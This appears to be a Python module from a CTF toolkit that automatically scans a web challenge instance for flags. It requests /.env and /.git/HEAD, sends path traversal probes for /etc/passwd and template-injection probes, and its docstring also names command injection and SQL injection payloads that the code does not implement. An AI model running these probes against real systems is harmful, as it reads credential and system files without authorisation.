"""Automated Web Challenge Scanner & Exploitation Engine.

Orchestrates multi-phase triage and automated exploitation against live CTF web instances:
1. Passive Recon: robots.txt, sitemap.xml, HTML comments, hidden form inputs/buttons, meta tags.
2. Response Header Inspection: Debug headers (x-debug, x-flag, x-debug-trace, server info).
3. Cookie & JWT Triage: Unsigned JWTs, role/admin cookies, base64 tokens.
4. Active Probes:
   - Path Traversal / LFI (/etc/passwd, flag.txt, ../)
   - Command Injection primitives (; cat flag.txt, | cat flag)
   - SQLi basic auth bypass (' OR 1=1 --)
   - SSTI basic probe ({{7*7}})
"""

from __future__ import annotations

import base64
import json
import re
import urllib.error
import urllib.parse
import urllib.request
from typing import Any

from ctf_toolkit.utils.flag_manager import get_flag_manager

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Apexsions-CTF-Pwn/1.0"


def scan_web_target(base_url: str, timeout: float = 6.0) -> dict[str, Any]:
    """Execute end-to-end automated web challenge sweep on target instance URL."""
    base_url = base_url.strip()
    if not base_url.startswith(("http://", "https://")):
        base_url = "http://" + base_url

    parsed_url = urllib.parse.urlparse(base_url)
    origin = f"{parsed_url.scheme}://{parsed_url.netloc}"

    fm = get_flag_manager()
    flags_found: list[str] = []
    findings: dict[str, Any] = {
        "target_url": base_url,
        "headers": {},
        "recon": {},
        "vulnerabilities": [],
        "probed_endpoints": [],
    }

    def _get(url: str, headers: dict | None = None) -> tuple[int, dict, bytes]:
        req_headers = {"User-Agent": USER_AGENT}
        if headers:
            req_headers.update(headers)
        req = urllib.request.Request(url, headers=req_headers)
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                status = resp.status
                h_dict = dict(resp.headers)
                body = resp.read()
                return status, h_dict, body
        except urllib.error.HTTPError as e:
            return e.code, dict(e.headers), e.read()
        except Exception as exc:
            return 0, {}, str(exc).encode("utf-8")

    # Phase 1: Inspect Landing Page & Response Headers
    status, headers, body = _get(base_url)
    findings["headers"] = {k: v for k, v in headers.items() if any(x in k.lower() for x in ("x-", "server", "set-cookie", "content"))}
    body_text = body.decode("latin-1", errors="ignore")

    # 1.1 Scan raw landing page body & headers for immediate flags
    for header_name, header_val in headers.items():
        fl = fm.extract_flags(header_val)
        if fl:
            flags_found.extend([f["flag"] for f in fl])
        # Check base64 in headers (like x-debug-trace: b64:...)
        if "b64:" in header_val:
            try:
                b64_part = header_val.split("b64:")[-1].strip()
                dec = base64.b64decode(b64_part).decode("latin-1", errors="ignore")
                fl_b64 = fm.extract_flags(dec)
                if fl_b64:
                    flags_found.extend([f["flag"] for f in fl_b64])
            except Exception:
                pass

    fl_body = fm.extract_flags(body_text)
    if fl_body:
        flags_found.extend([f["flag"] for f in fl_body])

    # 1.2 HTML Comments Triage
    comments = re.findall(r"<!--(.*?)-->", body_text, re.DOTALL)
    if comments:
        clean_comments = [c.strip() for c in comments if c.strip()]
        findings["recon"]["html_comments"] = clean_comments
        for c in clean_comments:
            fl_c = fm.extract_flags(c)
            if fl_c:
                flags_found.extend([f["flag"] for f in fl_c])

    # 1.3 Disabled Buttons or Hidden Inputs
    hidden_inputs = re.findall(r'<input[^>]+type=["\']hidden["\'][^>]*>', body_text, re.IGNORECASE)
    disabled_buttons = re.findall(r'<button[^>]+disabled[^>]*>(.*?)</button>', body_text, re.IGNORECASE | re.DOTALL)
    if hidden_inputs:
        findings["recon"]["hidden_inputs"] = hidden_inputs
    if disabled_buttons:
        findings["recon"]["disabled_buttons"] = disabled_buttons

    # Phase 2: Common Files Recon (robots.txt, sitemap.xml, .git, etc.)
    for probe_file in ("/robots.txt", "/sitemap.xml", "/.git/HEAD", "/.env", "/flag", "/flag.txt"):
        probe_url = urllib.parse.urljoin(origin, probe_file)
        p_status, p_headers, p_body = _get(probe_url)
        findings["probed_endpoints"].append({"path": probe_file, "status": p_status, "size": len(p_body)})
        if p_status == 200 and len(p_body) > 0:
            p_text = p_body.decode("latin-1", errors="ignore")
            findings["recon"][probe_file] = p_text[:500]
            fl_p = fm.extract_flags(p_text)
            if fl_p:
                flags_found.extend([f["flag"] for f in fl_p])

    # Phase 3: Active Parameter Probes (if landing page has query params or forms)
    # Check for basic LFI / Traversal on paths like /view?file=, /index.php?page=
    probe_params = ["file", "page", "path", "view", "doc", "id", "cmd", "q", "query"]
    for param in probe_params:
        # LFI probe
        lfi_url = f"{base_url.rstrip('/')}/?{param}=../../../../etc/passwd"
        l_status, _, l_body = _get(lfi_url)
        if b"root:x:0:0:" in l_body or b"GETSFLAG{" in l_body:
            findings["vulnerabilities"].append({"type": "LFI", "param": param, "url": lfi_url})
            fl_l = fm.extract_flags(l_body)
            if fl_l:
                flags_found.extend([f["flag"] for f in fl_l])

        # SSTI probe
        ssti_url = f"{base_url.rstrip('/')}/?{param}={{7*7}}"
        s_status, _, s_body = _get(ssti_url)
        if b"49" in s_body and b"{{7*7}}" not in s_body:
            findings["vulnerabilities"].append({"type": "SSTI", "param": param, "url": ssti_url})

    return {
        "success": True,
        "target": base_url,
        "flags_found": list(dict.fromkeys(flags_found)),
        "findings": findings,
    }
